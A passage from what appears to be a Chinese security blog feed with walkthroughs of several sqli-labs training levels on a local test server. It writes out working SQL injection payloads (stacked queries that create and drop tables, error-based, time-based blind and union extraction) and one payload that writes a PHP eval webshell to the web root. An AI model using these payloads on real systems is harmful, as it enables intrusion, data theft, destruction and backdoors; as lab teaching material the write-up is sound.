<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229828478.png" alt="1585229828478"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十关报错_时间_一句话_堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<p>使用堆叠注入插入和删除表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 ; create table admin like users; --+</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187215600.png" alt="1585187215600"></p>
<p>查看mysql，插入成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187241548.png" alt="1585187241548"></p>
<p>删除admin表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 ; drop table admin ; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187286989.png" alt="1585187286989"></p>
<h3 id="使用报错注入"><a href="#使用报错注入" class="headerlink" title="使用报错注入"></a>使用报错注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml(1,concat(0x7e,(database())),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187374501.png" alt="1585187374501"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187443849.png" alt="1585187443849"></p>
<p>查看字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187506662.png" alt="1585187506662"></p>
<h3 id="插入一句话木马"><a href="#插入一句话木马" class="headerlink" title="插入一句话木马"></a>插入一句话木马</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-50&#x2F;?sort&#x3D;1; select &#39;&lt;?php @eval($_POST[admin])?&gt;&#39; into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\one.php&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187720305.png" alt="1585187720305"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十二关时间_一句话_堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<p>因为没有报错回显，不能使用报错注入</p>
<p>使用时间注入，当判断大于1回显正常。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if((length(database())&gt;1),1,sleep(3))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585188477761.png" alt="1585188477761"></p>
<p>设置长度等于7，一直加载，说明错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585188515458.png" alt="1585188515458"></p>
<p>测试得出长度为8，加载完成</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585188551191.png" alt="1585188551191"></p>
<p>查看数据库，ascii等于115时页面加载成功，表示正确，其他一直加载，说明错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr(database(),1))&#x3D;115,1,sleep(3))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585188773553.png" alt="1585188773553"></p>
<p>经过测试得出当前数据库是security</p>
<p>查看表，当结果等于101的时候返回正常，其他加载，101对应的是e，经过测试得知当前表名为emails</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(3))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585189119008.png" alt="1585189119008"></p>
<p>查询emails下的字段，当ascii等于105是页面加载成功，说明正确，其他ascii码一直加载，说明错误，ascii中的105转义后是 i 的意思，经过测试第一个字段为id</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(3))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585189215613.png" alt="1585189215613"></p>
<p>查看id的第一个数据，当ascii等于49返回正常，其他加载，ascii 49 对应的是1，说明第一个数据为1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(3))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585189452671.png" alt="1585189452671"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十四关次数限制_union</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/</url>
    <content><![CDATA[<h4 id="提交security-key值"><a href="#提交security-key值" class="headerlink" title="提交security_key值"></a>提交security_key值</h4><p>查看原始页面，红线处为数据库名称</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585218423949.png" alt="1585218423949"></p>
<p>查看源码$id有单引号包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585218488177.png" alt="1585218488177"></p>
<p>在页面中使用单引号将 id值进行包裹，并加上注释符，页面返回成功，红线处为只有10次运行机会，需要在10次内完成挑战</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585218564674.png" alt="1585218564674"></p>
<p>查看数据库字段数，order by 4的时候页面不显示，3的时候页面返回正常，说明当前字段数据为3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585218631661.png" alt="1585218631661"></p>
<p>查看数据库注入点，注入点为2,3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585218779317.png" alt="1585218779317"></p>
<p>在2,3任意位置进行注入，获取了表名jgdv6lzlmt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-54&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585218889576.png" alt="1585218889576"></p>
<p>查看字段，取security就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-54&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;jgdv6lzlmt&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585219022508.png" alt="1585219022508"></p>
<p>查看secret_LXO3字段中的数据，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-54&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(secret_LXO3)from jgdv6lzlmt --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585219105671.png" alt="1585219105671"></p>
<p>成功获得了Secret_Key值，将这个值进行提交</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6_union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585219144030.png" alt="1585219144030"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十六关次数限制union</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/</url>
    <content><![CDATA[<p>查看初始界面，提供了CHALLENGES这个数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237452771.png" alt="1585237452771"></p>
<p>查看源码，红线处发现id被单引号和括号包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237504063.png" alt="1585237504063"></p>
<p>页面中加入单引号和括号注释符进行查看，页面返回正常，说明语句成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237556596.png" alt="1585237556596"></p>
<p>使用order by查看当前字段数，order by等于4的时候页面返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237601609.png" alt="1585237601609"></p>
<p>查看order by 3，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237638328.png" alt="1585237638328"></p>
<p>使用union select 查看注入点，注入点为2,3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237669546.png" alt="1585237669546"></p>
<p>因为初始页面已经给了数据库，并不需要查询，直接查看表名即可</p>
<p>也可以查看一下，返回值和初始页面给的一样</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237733479.png" alt="1585237733479"></p>
<p>查看表，获得gttnz12m3x表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-56&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237814810.png" alt="1585237814810"></p>
<p>查看表中字段，或者id,sessid,secret_MAMF,tryy四个字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-56&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;gttnz12m3x&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237849941.png" alt="1585237849941"></p>
<p>查看secret_MAMF字段中的数据，获取到了zFouSyjZX3ckJiJRNf95p8yf数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-56&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(secret_MAMF)from gttnz12m3x --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237894115.png" alt="1585237894115"></p>
<p>将zFouSyjZX3ckJiJRNf95p8yf数据提交</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237923030.png" alt="1585237923030"></p>
<p>页面返回，congrats you nailed it，表示恭喜你成功了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585237936290.png" alt="1585237936290"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十八关报错次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>查看源码，闭合为单引号，在页面尝试之后使用union select发现不回显注入点，说明不能使用union注入，使用报错注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585241545956.png" alt="1585241545956"></p>
<p>使用报错注入查看当前数据库，成功返回challenges</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(database())),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585241606723.png" alt="1585241606723"></p>
<p>查看表，成功回显，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585241797952.png" alt="1585241797952"></p>
<p>查看字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;4ba1mlox34&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585241867138.png" alt="1585241867138"></p>
<p>查看secret_E8N2字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-58&#x2F;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_E8N2)from 4ba1mlox34)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585241906209.png" alt="1585241906209"></p>
<p>提交数据，成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585241919317.png" alt="1585241919317"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第六关GET盲注</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先测试他的报错信息，这里我们使用单引号页面返回正常信息you are in，我们在尝试使用双引号发现页面报错，说明存在注入点</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584340394733.png" alt="1584340394733"></p>
